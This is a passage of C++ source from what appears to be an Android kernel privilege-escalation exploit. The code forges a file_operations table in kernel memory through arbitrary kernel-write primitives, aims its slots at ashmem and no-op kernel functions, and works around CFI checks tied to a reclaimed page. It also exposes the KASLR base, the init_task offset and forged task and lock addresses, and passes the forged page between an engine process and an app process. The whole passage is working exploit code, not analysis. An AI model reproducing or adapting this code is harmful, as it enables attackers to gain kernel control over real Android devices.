        {FOPS_SHOW_FDINFO_OFF, IMG_ASHMEM_SHOW_FDINFO},
    };
    for (auto &s : slots)
        if (!kernel_write64(fake_fops + s.off, text_addr(s.img))) return false;
    /* The reclaimed page also carries live mm_struct objects.  On PLF110 the
     * list head at +0x78 can repopulate itself after the initial spray, which
     * turns file_operations.flush into a data pointer.  Any forked helper that
     * exits then trips CFI in filp_close().  These two slots are intentionally
     * scalar/NULL in the forged table, so sanitize them through the already
     * verified configfs primitive before spawning the pipe-reclaim children. */
    if (!kernel_write64(fake_fops + FOPS_MMAP_SUPPORTED_FLAGS_OFF, 0) ||
        !kernel_write64(fake_fops + FOPS_FLUSH_OFF, 0)) return false;
    // llseek must be a real no-op function (something in userspace llseeks)
    return kernel_write64(fake_fops + FOPS_LLSEEK_OFF, text_addr(IMG_NOOP_LLSEEK));
}

/* public getters */
uint64_t get_fake_fops() { return fake_fops; }
uint64_t get_fake_lock() { return fake_lock; }
uint64_t get_fake_task() { return fake_task; }
uint64_t get_misc_fops_alias() { return alias(IMG_ASHMEM_MISC_FOPS); }
/* Hybrid handoff: the app process adopts the engine's page words so its
 * try_rw() (misc.fops == fake_fops compare) works without running the
 * leak+reclaim itself. The engine process stays parked holding the skb
 * pages that back this address range. */
void adopt_page(uint64_t fops, uint64_t lock, uint64_t task) {
    fake_fops = fops;
    fake_lock = lock;
    fake_task = task;
    page_base = fops - PG_FOPS;
    fake_w0 = page_base + 0x2220;
    binwrite_target = page_base + PG_SCRATCH;
}
uint64_t get_kaslr_base() { return kaslr_base; }
uint64_t get_ashmem_fops_img_off() { return IMG_ASHMEM_FOPS; }
uint64_t get_init_task_img_off() { return IMG_INIT_TASK; }
uint64_t get_zero_slot(int n) { return alias(IMG_ZERO_WINDOW + 0x4000 + (size_t) n * 0x40); }
void set_kaslr_base(uint64_t b) { kaslr_base = b; }

}  // namespace pe
